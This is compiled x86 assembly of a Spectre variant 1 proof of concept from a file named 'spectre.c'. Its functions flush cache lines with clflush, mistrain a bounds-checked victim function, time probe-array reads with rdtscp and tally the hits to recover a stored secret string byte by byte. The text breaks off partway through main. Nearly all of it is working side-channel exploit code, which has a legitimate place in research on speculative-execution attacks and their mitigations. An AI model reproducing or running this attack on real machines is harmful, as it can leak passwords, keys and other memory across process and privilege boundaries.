	.text
	.intel_syntax noprefix
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	call	.L0$pb
	.cfi_adjust_cfa_offset 4
.L0$pb:
	pop	eax
	.cfi_adjust_cfa_offset -4
.Ltmp0:
	add	eax, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp0-.L0$pb)
	mov	ecx, dword ptr [eax + array1_size@GOTOFF]
	xor	eax, eax
	cmp	ecx, dword ptr [esp + 4]
	seta	al
	ret
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	push	esi
	.cfi_def_cfa_offset 8
	.cfi_offset esi, -8
	call	.L1$pb
	.cfi_adjust_cfa_offset 4
.L1$pb:
	pop	eax
	.cfi_adjust_cfa_offset -4
.Ltmp1:
	add	eax, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp1-.L1$pb)
	mov	ecx, dword ptr [esp + 8]
	mov	edx, dword ptr [eax + array1_size@GOTOFF]
	xor	esi, esi
	cmp	edx, ecx
	cmova	esi, ecx
	movzx	ecx, byte ptr [eax + esi + array1@GOTOFF]
	shl	ecx, 9
	mov	cl, byte ptr [eax + ecx + array2@GOTOFF]
	and	byte ptr [eax + temp@GOTOFF], cl
	pop	esi
	.cfi_def_cfa_offset 4
	ret
.Lfunc_end1:
	.size	victim_function, .Lfunc_end1-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	push	ebp
	.cfi_def_cfa_offset 8
	push	ebx
	.cfi_def_cfa_offset 12
	push	edi
	.cfi_def_cfa_offset 16
	push	esi
	.cfi_def_cfa_offset 20
	sub	esp, 28
	.cfi_def_cfa_offset 48
	.cfi_offset esi, -20
	.cfi_offset edi, -16
	.cfi_offset ebx, -12
	.cfi_offset ebp, -8
	call	.L2$pb
	.cfi_adjust_cfa_offset 4
.L2$pb:
	pop	edi
	.cfi_adjust_cfa_offset -4
.Ltmp2:
	add	edi, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp2-.L2$pb)
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	lea	eax, [edi + readMemoryByte.results@GOTOFF]
	mov	ebx, edi
	push	1024
	.cfi_adjust_cfa_offset 4
	push	0
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	call	memset@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	dword ptr [esp + 20], 0         # 4-byte Folded Spill
	mov	dword ptr [esp + 8], 999        # 4-byte Folded Spill
	.p2align	4, 0x90
.LBB2_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB2_2 Depth 2
                                        #     Child Loop BB2_4 Depth 2
                                        #       Child Loop BB2_30 Depth 3
                                        #     Child Loop BB2_7 Depth 2
                                        #     Child Loop BB2_13 Depth 2
	xor	eax, eax
	.p2align	4, 0x90
.LBB2_2:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	clflush	byte ptr [edi + eax + array2@GOTOFF]
	clflush	byte ptr [edi + eax + array2@GOTOFF+512]
	clflush	byte ptr [edi + eax + array2@GOTOFF+1024]
	clflush	byte ptr [edi + eax + array2@GOTOFF+1536]
	clflush	byte ptr [edi + eax + array2@GOTOFF+2048]
	clflush	byte ptr [edi + eax + array2@GOTOFF+2560]
	clflush	byte ptr [edi + eax + array2@GOTOFF+3072]
	clflush	byte ptr [edi + eax + array2@GOTOFF+3584]
	add	eax, 4096
	cmp	eax, 131072
	jne	.LBB2_2
# %bb.3:                                #   in Loop: Header=BB2_1 Depth=1
	mov	eax, dword ptr [esp + 8]        # 4-byte Reload
	cdq
	idiv	dword ptr [edi + array1_size@GOTOFF]
	mov	ebp, edx
	mov	dword ptr [esp + 12], edx       # 4-byte Spill
	xor	ebp, dword ptr [esp + 48]
	mov	esi, 29
	jmp	.LBB2_4
	.p2align	4, 0x90
.LBB2_5:                                #   in Loop: Header=BB2_4 Depth=2
	mov	eax, esi
	mov	ecx, -1431655765
	mul	ecx
	shr	edx
	and	edx, -2
	lea	eax, [edx + 2*edx]
	not	eax
	add	eax, esi
	mov	ecx, eax
	and	ecx, -65536
	shr	eax, 16
	or	eax, ecx
	and	eax, ebp
	xor	eax, dword ptr [esp + 12]       # 4-byte Folded Reload
	sub	esp, 12
	.cfi_adjust_cfa_offset 12
	mov	ebx, edi
	push	eax
	.cfi_adjust_cfa_offset 4
	call	victim_function
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	sub	esi, 1
	jb	.LBB2_6
.LBB2_4:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB2_30 Depth 3
	clflush	byte ptr [edi + array1_size@GOTOFF]
	mov	dword ptr [esp + 16], 0
	mov	eax, dword ptr [esp + 16]
	cmp	eax, 99
	jg	.LBB2_5
	.p2align	4, 0x90
.LBB2_30:                               #   Parent Loop BB2_1 Depth=1
                                        #     Parent Loop BB2_4 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	add	dword ptr [esp + 16], 1
	mov	eax, dword ptr [esp + 16]
	cmp	eax, 100
	jl	.LBB2_30
	jmp	.LBB2_5
	.p2align	4, 0x90
.LBB2_6:                                #   in Loop: Header=BB2_1 Depth=1
	mov	ebx, 13
	jmp	.LBB2_7
	.p2align	4, 0x90
.LBB2_11:                               #   in Loop: Header=BB2_7 Depth=2
	add	ebx, 167
	cmp	ebx, 42765
	je	.LBB2_12
.LBB2_7:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	mov	esi, ebx
	and	esi, 255
	je	.LBB2_11
# %bb.8:                                #   in Loop: Header=BB2_7 Depth=2
	mov	ebp, esi
	shl	ebp, 9
	rdtscp
	mov	dword ptr [esp + 24], eax       # 4-byte Spill
	mov	dword ptr [esp + 12], edx       # 4-byte Spill
	movzx	eax, byte ptr [edi + ebp + array2@GOTOFF]
	rdtscp
	mov	dword ptr [esp + 20], ecx       # 4-byte Spill
	sub	eax, dword ptr [esp + 24]       # 4-byte Folded Reload
	sbb	edx, dword ptr [esp + 12]       # 4-byte Folded Reload
	mov	ecx, 100
	cmp	ecx, eax
	mov	eax, 0
	sbb	eax, edx
	jb	.LBB2_11
# %bb.9:                                #   in Loop: Header=BB2_7 Depth=2
	mov	eax, dword ptr [esp + 8]        # 4-byte Reload
	cdq
	idiv	dword ptr [edi + array1_size@GOTOFF]
	cmp	bl, byte ptr [edi + edx + array1@GOTOFF]
	je	.LBB2_11
# %bb.10:                               #   in Loop: Header=BB2_7 Depth=2
	add	dword ptr [edi + 4*esi + readMemoryByte.results@GOTOFF], 1
	jmp	.LBB2_11
	.p2align	4, 0x90
.LBB2_12:                               #   in Loop: Header=BB2_1 Depth=1
	mov	eax, -1
	xor	edx, edx
	lea	esi, [edi + readMemoryByte.results@GOTOFF+4]
	mov	ecx, -1
	jmp	.LBB2_13
	.p2align	4, 0x90
.LBB2_20:                               #   in Loop: Header=BB2_13 Depth=2
	mov	ecx, eax
	mov	eax, ebx
.LBB2_25:                               #   in Loop: Header=BB2_13 Depth=2
	add	edx, 2
	add	esi, 8
	cmp	edx, 256
	je	.LBB2_26
.LBB2_13:                               #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	test	eax, eax
	js	.LBB2_14
# %bb.15:                               #   in Loop: Header=BB2_13 Depth=2
	mov	ebx, dword ptr [esi - 4]
	cmp	ebx, dword ptr [edi + 4*eax + readMemoryByte.results@GOTOFF]
	jge	.LBB2_14
# %bb.16:                               #   in Loop: Header=BB2_13 Depth=2
	test	ecx, ecx
	js	.LBB2_18
# %bb.17:                               #   in Loop: Header=BB2_13 Depth=2
	cmp	ebx, dword ptr [edi + 4*ecx + readMemoryByte.results@GOTOFF]
	jl	.LBB2_19
.LBB2_18:                               #   in Loop: Header=BB2_13 Depth=2
	mov	ecx, edx
.LBB2_19:                               #   in Loop: Header=BB2_13 Depth=2
	lea	ebx, [edx + 1]
	test	eax, eax
	jns	.LBB2_21
	jmp	.LBB2_20
	.p2align	4, 0x90
.LBB2_14:                               #   in Loop: Header=BB2_13 Depth=2
	mov	ecx, eax
	mov	eax, edx
	lea	ebx, [edx + 1]
	test	eax, eax
	js	.LBB2_20
.LBB2_21:                               #   in Loop: Header=BB2_13 Depth=2
	mov	ebp, dword ptr [esi]
	cmp	ebp, dword ptr [edi + 4*eax + readMemoryByte.results@GOTOFF]
	jge	.LBB2_20
# %bb.22:                               #   in Loop: Header=BB2_13 Depth=2
	test	ecx, ecx
	js	.LBB2_24
# %bb.23:                               #   in Loop: Header=BB2_13 Depth=2
	cmp	ebp, dword ptr [edi + 4*ecx + readMemoryByte.results@GOTOFF]
	jl	.LBB2_25
.LBB2_24:                               #   in Loop: Header=BB2_13 Depth=2
	mov	ecx, ebx
	jmp	.LBB2_25
	.p2align	4, 0x90
.LBB2_26:                               #   in Loop: Header=BB2_1 Depth=1
	mov	edx, dword ptr [edi + 4*eax + readMemoryByte.results@GOTOFF]
	mov	esi, dword ptr [edi + 4*ecx + readMemoryByte.results@GOTOFF]
	lea	ebx, [esi + esi]
	add	ebx, 5
	cmp	edx, ebx
	jge	.LBB2_29
# %bb.27:                               #   in Loop: Header=BB2_1 Depth=1
	xor	edx, 2
	or	edx, esi
	je	.LBB2_29
# %bb.28:                               #   in Loop: Header=BB2_1 Depth=1
	mov	esi, dword ptr [esp + 8]        # 4-byte Reload
	lea	edx, [esi - 1]
	cmp	esi, 1
	mov	dword ptr [esp + 8], edx        # 4-byte Spill
	ja	.LBB2_1
.LBB2_29:
	mov	edx, dword ptr [esp + 20]       # 4-byte Reload
	xor	dword ptr [edi + readMemoryByte.results@GOTOFF], edx
	mov	esi, dword ptr [esp + 52]
	mov	byte ptr [esi], al
	mov	eax, dword ptr [edi + 4*eax + readMemoryByte.results@GOTOFF]
	mov	edx, dword ptr [esp + 56]
	mov	dword ptr [edx], eax
	mov	byte ptr [esi + 1], cl
	mov	eax, dword ptr [edi + 4*ecx + readMemoryByte.results@GOTOFF]
	mov	dword ptr [edx + 4], eax
	add	esp, 28
	.cfi_def_cfa_offset 20
	pop	esi
	.cfi_def_cfa_offset 16
	pop	edi
	.cfi_def_cfa_offset 12
	pop	ebx
	.cfi_def_cfa_offset 8
	pop	ebp
	.cfi_def_cfa_offset 4
	ret
.Lfunc_end2:
	.size	readMemoryByte, .Lfunc_end2-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	push	ebp
	.cfi_def_cfa_offset 8
	push	ebx
	.cfi_def_cfa_offset 12
	push	edi
	.cfi_def_cfa_offset 16
	push	esi
	.cfi_def_cfa_offset 20
	sub	esp, 76
	.cfi_def_cfa_offset 96
	.cfi_offset esi, -20
	.cfi_offset edi, -16
	.cfi_offset ebx, -12
	.cfi_offset ebp, -8
	call	.L3$pb
	.cfi_adjust_cfa_offset 4
.L3$pb:
	pop	edi
	.cfi_adjust_cfa_offset -4
.Ltmp3:
	add	edi, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp3-.L3$pb)
	mov	eax, dword ptr [edi + stdin@GOT]
	mov	dword ptr [esp + 68], eax       # 4-byte Spill
	lea	eax, [edi + check@GOTOFF]
	mov	dword ptr [esp + 64], eax       # 4-byte Spill
	lea	eax, [edi + .L.str.13@GOTOFF]
	mov	dword ptr [esp + 60], eax       # 4-byte Spill
	lea	eax, [edi + .L.str.1@GOTOFF]
	mov	dword ptr [esp + 56], eax       # 4-byte Spill
	lea	eax, [edi + array1@GOTOFF]
	mov	dword ptr [esp + 36], eax       # 4-byte Spill
	lea	eax, [edi + array2@GOTOFF]
	mov	dword ptr [esp + 52], eax       # 4-byte Spill
	lea	eax, [edi + .L.str.2@GOTOFF]
	mov	dword ptr [esp + 48], eax       # 4-byte Spill
	mov	dword ptr [esp + 12], edi       # 4-byte Spill
	jmp	.LBB3_2
	.p2align	4, 0x90
.LBB3_1:                                #   in Loop: Header=BB3_2 Depth=1
	mov	ebx, edi
	call	getpid@PLT
	xor	ecx, ecx
	mov	edx, dword ptr [esp + 64]       # 4-byte Reload
	add	edx, 33
	setb	cl
	push	eax
	.cfi_adjust_cfa_offset 4
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	edx
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 72]            # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
.LBB3_2:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_10 Depth 2
                                        #       Child Loop BB3_11 Depth 3
                                        #         Child Loop BB3_12 Depth 4
                                        #         Child Loop BB3_15 Depth 4
                                        #           Child Loop BB3_16 Depth 5
                                        #         Child Loop BB3_19 Depth 4
                                        #         Child Loop BB3_26 Depth 4
	sub	esp, 12
	.cfi_adjust_cfa_offset 12
	mov	ebx, edi
	mov	eax, dword ptr [esp + 80]       # 4-byte Reload
	push	dword ptr [eax]
	.cfi_adjust_cfa_offset 4
	call	getc@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	shl	eax, 24
	cmp	eax, 167772160
	je	.LBB3_2
# %bb.3:                                #   in Loop: Header=BB3_2 Depth=1
	cmp	eax, 1761607680
	je	.LBB3_1
# %bb.4:                                #   in Loop: Header=BB3_2 Depth=1
	cmp	eax, 1912602624
	jne	.LBB3_45
# %bb.5:                                #   in Loop: Header=BB3_2 Depth=1
	mov	eax, dword ptr [edi + secret@GOTOFF]
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	mov	ebx, edi
	push	eax
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 68]            # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	eax, dword ptr [edi + secret@GOTOFF]
	mov	ecx, eax
	sub	ecx, dword ptr [esp + 36]       # 4-byte Folded Reload
	mov	dword ptr [esp + 20], ecx
	sub	esp, 12
	.cfi_adjust_cfa_offset 12
	push	eax
	.cfi_adjust_cfa_offset 4
	call	strlen@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	esi, eax
	mov	dword ptr [esp + 16], eax
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	push	131072
	.cfi_adjust_cfa_offset 4
	push	1
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 64]            # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	call	memset@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	cmp	dword ptr [esp + 96], 3
	jne	.LBB3_7
# %bb.6:                                #   in Loop: Header=BB3_2 Depth=1
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	mov	ebx, edi
	lea	eax, [esp + 24]
	push	eax
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 56]            # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	mov	esi, dword ptr [esp + 112]
	push	dword ptr [esi + 4]
	.cfi_adjust_cfa_offset 4
	call	__isoc99_sscanf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	eax, dword ptr [esp + 36]       # 4-byte Reload
	sub	dword ptr [esp + 20], eax
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	lea	eax, [edi + .L.str.3@GOTOFF]
	lea	ecx, [esp + 20]
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esi + 8]
	.cfi_adjust_cfa_offset 4
	call	__isoc99_sscanf@PLT
	add	esp, 12
	.cfi_adjust_cfa_offset -12
	lea	eax, [edi + .L.str.4@GOTOFF]
	push	dword ptr [esp + 20]
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 28]
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	esi, dword ptr [esp + 16]
.LBB3_7:                                #   in Loop: Header=BB3_2 Depth=1
	sub	esp, 8
	.cfi_adjust_cfa_offset 8
	lea	eax, [edi + .L.str.5@GOTOFF]
	mov	ebx, edi
	push	esi
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	eax, dword ptr [esp + 16]
	lea	ecx, [eax - 1]
	mov	dword ptr [esp + 16], ecx
	test	eax, eax
	jle	.LBB3_2
# %bb.8:                                #   in Loop: Header=BB3_2 Depth=1
	mov	dword ptr [esp + 40], 0         # 4-byte Folded Spill
	jmp	.LBB3_10
	.p2align	4, 0x90
.LBB3_9:                                #   in Loop: Header=BB3_10 Depth=2
	sub	esp, 12
	.cfi_adjust_cfa_offset 12
	mov	ebx, edi
	push	10
	.cfi_adjust_cfa_offset 4
	call	putchar@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	eax, dword ptr [esp + 16]
	lea	ecx, [eax - 1]
	mov	dword ptr [esp + 16], ecx
	test	eax, eax
	jle	.LBB3_2
.LBB3_10:                               #   Parent Loop BB3_2 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB3_11 Depth 3
                                        #         Child Loop BB3_12 Depth 4
                                        #         Child Loop BB3_15 Depth 4
                                        #           Child Loop BB3_16 Depth 5
                                        #         Child Loop BB3_19 Depth 4
                                        #         Child Loop BB3_26 Depth 4
	mov	eax, dword ptr [edi + secret@GOTOFF]
	mov	esi, dword ptr [esp + 40]       # 4-byte Reload
	movsx	eax, byte ptr [eax + esi]
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	lea	ecx, [edi + .L.str.6@GOTOFF]
	mov	ebx, edi
	push	eax
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 28]
	.cfi_adjust_cfa_offset 4
	push	ecx
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	add	esi, 1
	mov	dword ptr [esp + 40], esi       # 4-byte Spill
	mov	eax, dword ptr [esp + 20]
	mov	dword ptr [esp + 72], eax       # 4-byte Spill
	add	eax, 1
	mov	dword ptr [esp + 20], eax
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	lea	eax, [edi + readMemoryByte.results@GOTOFF]
	push	1024
	.cfi_adjust_cfa_offset 4
	push	0
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	call	memset@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	dword ptr [esp + 28], 999       # 4-byte Folded Spill
	mov	dword ptr [esp + 44], 0         # 4-byte Folded Spill
	.p2align	4, 0x90
.LBB3_11:                               #   Parent Loop BB3_2 Depth=1
                                        #     Parent Loop BB3_10 Depth=2
                                        # =>    This Loop Header: Depth=3
                                        #         Child Loop BB3_12 Depth 4
                                        #         Child Loop BB3_15 Depth 4
                                        #           Child Loop BB3_16 Depth 5
                                        #         Child Loop BB3_19 Depth 4
                                        #         Child Loop BB3_26 Depth 4
	xor	eax, eax
	.p2align	4, 0x90
.LBB3_12:                               #   Parent Loop BB3_2 Depth=1
                                        #     Parent Loop BB3_10 Depth=2
                                        #       Parent Loop BB3_11 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	clflush	byte ptr [edi + eax + array2@GOTOFF]
	clflush	byte ptr [edi + eax + array2@GOTOFF+512]
	clflush	byte ptr [edi + eax + array2@GOTOFF+1024]
	clflush	byte ptr [edi + eax + array2@GOTOFF+1536]
	clflush	byte ptr [edi + eax + array2@GOTOFF+2048]
	clflush	byte ptr [edi + eax + array2@GOTOFF+2560]
	clflush	byte ptr [edi + eax + array2@GOTOFF+3072]
	clflush	byte ptr [edi + eax + array2@GOTOFF+3584]
	add	eax, 4096
	cmp	eax, 131072
	jne	.LBB3_12
# %bb.13:                               #   in Loop: Header=BB3_11 Depth=3
	mov	eax, dword ptr [esp + 28]       # 4-byte Reload
	cdq
	idiv	dword ptr [edi + array1_size@GOTOFF]
	mov	ebp, edx
	mov	dword ptr [esp + 24], edx       # 4-byte Spill
	xor	ebp, dword ptr [esp + 72]       # 4-byte Folded Reload
	mov	esi, 29
	jmp	.LBB3_15
	.p2align	4, 0x90
.LBB3_14:                               #   in Loop: Header=BB3_15 Depth=4
	mov	eax, esi
	mov	ecx, -1431655765
	mul	ecx
	shr	edx
	and	edx, -2
	lea	eax, [edx + 2*edx]
	not	eax
	add	eax, esi
	mov	ecx, eax
	and	ecx, -65536
	shr	eax, 16
	or	eax, ecx
	and	eax, ebp
	xor	eax, dword ptr [esp + 24]       # 4-byte Folded Reload
	sub	esp, 12
	.cfi_adjust_cfa_offset 12
	mov	ebx, edi
	push	eax
	.cfi_adjust_cfa_offset 4
	call	victim_function
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	sub	esi, 1
	jb	.LBB3_17
.LBB3_15:                               #   Parent Loop BB3_2 Depth=1
                                        #     Parent Loop BB3_10 Depth=2
                                        #       Parent Loop BB3_11 Depth=3
                                        # =>      This Loop Header: Depth=4
                                        #           Child Loop BB3_16 Depth 5
	clflush	byte ptr [edi + array1_size@GOTOFF]
	mov	dword ptr [esp + 32], 0
	mov	eax, dword ptr [esp + 32]
	cmp	eax, 99
	jg	.LBB3_14
	.p2align	4, 0x90
.LBB3_16:                               #   Parent Loop BB3_2 Depth=1
                                        #     Parent Loop BB3_10 Depth=2
                                        #       Parent Loop BB3_11 Depth=3
                                        #         Parent Loop BB3_15 Depth=4
                                        # =>        This Inner Loop Header: Depth=5
	add	dword ptr [esp + 32], 1
	mov	eax, dword ptr [esp + 32]
	cmp	eax, 100
	jl	.LBB3_16
	jmp	.LBB3_14
	.p2align	4, 0x90
.LBB3_17:                               #   in Loop: Header=BB3_11 Depth=3
	mov	ebx, 13
	jmp	.LBB3_19
	.p2align	4, 0x90
.LBB3_18:                               #   in Loop: Header=BB3_19 Depth=4
	add	ebx, 167
	cmp	ebx, 42765
	je	.LBB3_23
.LBB3_19:                               #   Parent Loop BB3_2 Depth=1
                                        #     Parent Loop BB3_10 Depth=2
                                        #       Parent Loop BB3_11 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	mov	ebp, ebx
	and	ebp, 255
	je	.LBB3_18
# %bb.20:                               #   in Loop: Header=BB3_19 Depth=4
	mov	edi, ebp
	shl	edi, 9
	rdtscp
	mov	esi, eax
	mov	dword ptr [esp + 24], edx       # 4-byte Spill
	mov	ecx, dword ptr [esp + 12]       # 4-byte Reload
	movzx	eax, byte ptr [ecx + edi + array2@GOTOFF]
	mov	edi, ecx
	rdtscp
	mov	dword ptr [esp + 44], ecx       # 4-byte Spill
	sub	eax, esi
	sbb	edx, dword ptr [esp + 24]       # 4-byte Folded Reload
	mov	ecx, 100
	cmp	ecx, eax
	mov	eax, 0
	sbb	eax, edx
	jb	.LBB3_18
# %bb.21:                               #   in Loop: Header=BB3_19 Depth=4
	mov	eax, dword ptr [esp + 28]       # 4-byte Reload
	cdq
	idiv	dword ptr [edi + array1_size@GOTOFF]
	cmp	bl, byte ptr [edi + edx + array1@GOTOFF]
	je	.LBB3_18
# %bb.22:                               #   in Loop: Header=BB3_19 Depth=4
	add	dword ptr [edi + 4*ebp + readMemoryByte.results@GOTOFF], 1
	jmp	.LBB3_18
	.p2align	4, 0x90
.LBB3_23:                               #   in Loop: Header=BB3_11 Depth=3
	mov	edx, -1
	xor	eax, eax
	mov	edi, dword ptr [esp + 12]       # 4-byte Reload
	lea	ecx, [edi + readMemoryByte.results@GOTOFF+4]
	mov	ebx, -1
	jmp	.LBB3_26
	.p2align	4, 0x90
.LBB3_24:                               #   in Loop: Header=BB3_26 Depth=4
	mov	ebx, ebp
	add	eax, 2
	add	ecx, 8
	cmp	eax, 256
	je	.LBB3_40
.LBB3_26:                               #   Parent Loop BB3_2 Depth=1
                                        #     Parent Loop BB3_10 Depth=2
                                        #       Parent Loop BB3_11 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	test	edx, edx
	js	.LBB3_31
# %bb.27:                               #   in Loop: Header=BB3_26 Depth=4
	mov	ebp, edx
	mov	edx, dword ptr [ecx - 4]
	cmp	edx, dword ptr [edi + 4*ebp + readMemoryByte.results@GOTOFF]
	jge	.LBB3_33
# %bb.28:                               #   in Loop: Header=BB3_26 Depth=4
	test	ebx, ebx
	js	.LBB3_30
# %bb.29:                               #   in Loop: Header=BB3_26 Depth=4
	cmp	edx, dword ptr [edi + 4*ebx + readMemoryByte.results@GOTOFF]
	jl	.LBB3_32
.LBB3_30:                               #   in Loop: Header=BB3_26 Depth=4
	mov	ebx, eax
	lea	edx, [eax + 1]
	test	ebp, ebp
	jns	.LBB3_34
	jmp	.LBB3_24
	.p2align	4, 0x90
.LBB3_31:                               #   in Loop: Header=BB3_26 Depth=4
	mov	ebx, edx
	mov	ebp, eax
.LBB3_32:                               #   in Loop: Header=BB3_26 Depth=4
	lea	edx, [eax + 1]
	test	ebp, ebp
	jns	.LBB3_34
	jmp	.LBB3_24
	.p2align	4, 0x90
.LBB3_33:                               #   in Loop: Header=BB3_26 Depth=4
	mov	ebx, ebp
	mov	ebp, eax
	lea	edx, [eax + 1]
	test	ebp, ebp
	js	.LBB3_24
.LBB3_34:                               #   in Loop: Header=BB3_26 Depth=4
	mov	esi, dword ptr [ecx]
	cmp	esi, dword ptr [edi + 4*ebp + readMemoryByte.results@GOTOFF]
	jge	.LBB3_24
# %bb.35:                               #   in Loop: Header=BB3_26 Depth=4
	test	ebx, ebx
	js	.LBB3_37
# %bb.36:                               #   in Loop: Header=BB3_26 Depth=4
	cmp	esi, dword ptr [edi + 4*ebx + readMemoryByte.results@GOTOFF]
	jl	.LBB3_38
.LBB3_37:                               #   in Loop: Header=BB3_26 Depth=4
	mov	ebx, edx
.LBB3_38:                               #   in Loop: Header=BB3_26 Depth=4
	mov	edx, ebp
	add	eax, 2
	add	ecx, 8
	cmp	eax, 256
	jne	.LBB3_26
.LBB3_40:                               #   in Loop: Header=BB3_11 Depth=3
	mov	esi, edx
	mov	eax, dword ptr [edi + 4*edx + readMemoryByte.results@GOTOFF]
	mov	ecx, dword ptr [edi + 4*ebx + readMemoryByte.results@GOTOFF]
	lea	edx, [ecx + ecx]
	add	edx, 5
	cmp	eax, edx
	jge	.LBB3_43
# %bb.41:                               #   in Loop: Header=BB3_11 Depth=3
	xor	eax, 2
	or	eax, ecx
	je	.LBB3_43
# %bb.42:                               #   in Loop: Header=BB3_11 Depth=3
	mov	ecx, dword ptr [esp + 28]       # 4-byte Reload
	lea	eax, [ecx - 1]
	cmp	ecx, 1
	mov	dword ptr [esp + 28], eax       # 4-byte Spill
	ja	.LBB3_11
.LBB3_43:                               #   in Loop: Header=BB3_10 Depth=2
	mov	eax, dword ptr [esp + 44]       # 4-byte Reload
	xor	dword ptr [edi + readMemoryByte.results@GOTOFF], eax
	mov	eax, dword ptr [esp + 12]       # 4-byte Reload
	mov	edi, dword ptr [eax + 4*esi + readMemoryByte.results@GOTOFF]
	mov	eax, dword ptr [esp + 12]       # 4-byte Reload
	mov	ebp, dword ptr [eax + 4*ebx + readMemoryByte.results@GOTOFF]
	mov	eax, ebp
	add	eax, ebp
	cmp	edi, eax
	mov	eax, dword ptr [esp + 12]       # 4-byte Reload
	lea	eax, [eax + .L.str.9@GOTOFF]
	mov	ecx, dword ptr [esp + 12]       # 4-byte Reload
	lea	ecx, [ecx + .L.str.8@GOTOFF]
	cmovl	ecx, eax
	sub	esp, 8
	.cfi_adjust_cfa_offset 8
	mov	eax, dword ptr [esp + 20]       # 4-byte Reload
	lea	eax, [eax + .L.str.7@GOTOFF]
	mov	dword ptr [esp + 32], ebx       # 4-byte Spill
	mov	ebx, dword ptr [esp + 20]       # 4-byte Reload
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	ecx, esi
	movzx	eax, cl
	add	cl, -32
	cmp	cl, 95
	mov	ecx, 63
	cmovb	ecx, eax
	mov	edx, dword ptr [esp + 12]       # 4-byte Reload
	lea	edx, [edx + .L.str.10@GOTOFF]
	mov	ebx, dword ptr [esp + 12]       # 4-byte Reload
	push	edi
	mov	edi, dword ptr [esp + 16]       # 4-byte Reload
	.cfi_adjust_cfa_offset 4
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	push	edx
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	test	ebp, ebp
	jle	.LBB3_9
# %bb.44:                               #   in Loop: Header=BB3_10 Depth=2
	mov	ecx, dword ptr [esp + 24]       # 4-byte Reload
	movzx	eax, cl
	add	cl, -32
	cmp	cl, 95
	mov	ecx, 63
	cmovb	ecx, eax
	lea	edx, [edi + .L.str.11@GOTOFF]
	mov	ebx, edi
	push	ebp
	.cfi_adjust_cfa_offset 4
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	push	edx
	.cfi_adjust_cfa_offset 4
